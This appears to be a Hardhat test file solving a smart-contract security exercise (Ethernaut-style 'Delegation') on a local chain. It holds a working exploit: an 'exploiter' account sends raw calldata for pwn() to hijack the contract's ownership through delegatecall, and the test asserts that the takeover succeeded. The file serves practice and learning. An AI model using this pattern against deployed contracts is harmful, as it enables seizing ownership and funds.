import { deployments, ethers, network } from "hardhat"
import { assert, expect } from "chai"
import { developmentChains, networkConfig } from "../../helper-hardhat-config"
import { SignerWithAddress } from "@nomiclabs/hardhat-ethers/signers"
import { Delegate, Delegation } from "../../typechain-types"

!developmentChains.includes(network.name)
    ? describe.skip
    : describe("Delegate Testing", () => {
          let deployer: SignerWithAddress, exploiter: SignerWithAddress
          let delegate: Delegate, delegation: Delegation
          let ABI = ["function pwn()"]
          let iface = new ethers.utils.Interface(ABI)

          before(async () => {
              await deployments.fixture(["delegate"])
              const accounts = await ethers.getSigners()
              deployer = accounts[0]
              exploiter = accounts[1]

              delegate = await ethers.getContract("Delegate")
              delegation = await ethers.getContract("Delegation")
          })

          it("Delegate Testing Exploit", async () => {
              const owner = await delegation.owner()
              expect(owner).equals(deployer.address, "owner before exploit == deployer")

              const randomTx = {
                  to: delegation.address,
                  data: iface.encodeFunctionData("pwn"),
                  gasLimit: ethers.BigNumber.from("100000"), //-n note that we need to pass a gas limit for this tx
                  // -n not passing it would fail the txn due to out of gas exception
                  // -n although all logic is right, you might still not be able to complete tx if you get this wrong
              }
              const sendTx = await exploiter.sendTransaction(randomTx)
              await sendTx.wait(1)
              const newOwner = await delegation.owner()
              expect(newOwner).equals(exploiter.address, "owner after exploit == exploiter")
          })
      })
